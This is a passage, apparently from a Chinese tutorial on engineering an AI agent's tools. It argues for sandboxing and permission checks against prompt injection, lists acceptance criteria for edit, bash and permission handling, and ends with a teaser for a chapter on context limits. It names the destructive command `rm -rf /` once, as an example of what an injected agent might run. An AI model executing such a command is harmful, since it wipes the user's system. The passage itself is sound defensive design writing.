**不可简化的：** 沙箱和权限。这不是模型能力问题——是外部威胁模型。即使模型永远不会主动执行 `rm -rf /`，prompt injection 攻击可能让它这么做。即使没有攻击，多租户环境中的资源隔离也是必需的。OS 级安全边界的复杂度不会因为模型进步而降低——因为威胁来自模型之外。

---

## 检验标准

- [ ] LLM 输出带智能引号时，模糊匹配成功
- [ ] Edit 多匹配时拒绝执行并返回引导信息
- [ ] Bash 超时时杀掉整个进程树
- [ ] 大输出正确截断并保留尾部
- [ ] 同一文件并发 Edit 串行执行
- [ ] 变更工具需权限确认，只读工具直接执行
- [ ] 错误消息包含足够上下文让 LLM 下一 turn 自修复

工具可靠了，信任机制也就位了。但你跑了一个 30 分钟的长任务后发现——Agent 开始重复之前做过的工作，好像忘了自己五分钟前的发现。上下文满了。下一章，我们解决遗忘问题。